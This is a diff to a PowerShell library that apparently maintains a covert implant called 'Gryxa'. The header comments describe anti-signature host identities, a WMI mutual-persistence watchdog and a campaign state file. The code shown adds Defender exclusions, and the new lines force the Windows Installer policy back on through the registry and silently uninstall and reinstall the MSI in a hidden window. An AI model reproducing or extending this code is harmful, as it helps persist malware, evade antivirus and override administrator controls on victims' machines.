@@ -1,9 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L32
+# OWN_LIB  BUILD 20260802L33
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L32: single-flight lock requires live msiexec (stale wrapper self-clears); wrapper self-deletes after install. L31: github-first MSI.
+# L33: pre-clean target MSI ProductCode before /i (cross-FP ProductCode collision -> maintenance-mode 1603). L32: stale-lock fix.
 # L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
 # L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
 # L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
@@ -554,6 +554,16 @@ function Add-ScDefenderExclusion([string]$Fp) {
 
 function Start-GryxaInstall([string]$MsiPath, [string]$Fp, [string]$LogFile) {
     Add-ScDefenderExclusion $Fp
+    # L33: the new gryxa MSI can share a ProductCode with a prior FP's install (cross-FP
+    # ProductCode collision). If that ProductCode is already registered, msiexec /i drops
+    # into maintenance mode and fails 1603. Uninstall the ProductCode first so /i is a
+    # clean INSTALL. /x on an unregistered code is a cheap no-op (1605), so always try it.
+    $pc = Get-MsiProperty $MsiPath 'ProductCode'
+    if ($pc) {
+        & reg.exe add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /t REG_DWORD /d 0 /f 2>&1 | Out-Null
+        Start-Process msiexec.exe -ArgumentList "/x $pc /qn /norestart REBOOT=ReallySuppress" -Wait -WindowStyle Hidden
+        Start-Sleep -Seconds 5
+    }
     $cmd = Join-Path $WorkDir 'gryxa_install.cmd'
     $lines = @(
         '@echo off',
